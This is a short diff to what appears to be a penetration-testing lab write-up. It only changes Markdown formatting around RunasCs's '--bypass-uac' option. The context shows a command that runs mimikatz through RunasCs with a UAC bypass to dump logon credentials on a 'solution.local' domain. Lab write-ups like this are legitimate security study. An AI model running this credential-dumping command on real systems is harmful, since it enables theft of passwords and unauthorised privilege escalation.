@@ -77,7 +77,7 @@ The runas from windows doesn't seem to have this function, but fortunately the s
 
 Let's use  [RunasCS.exe](https://github.com/antonioCoco/RunasCs)
 
-In the documentation, they provide a ==-b== or ==--bypass-uac== to bypass UAC, convenient for our usage
+In the documentation, they provide a *-b* or *--bypass-uac* to bypass UAC, convenient for our usage
 
 ```
 RunasCs.exe [username] [password] "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit" -domain solution.local -b
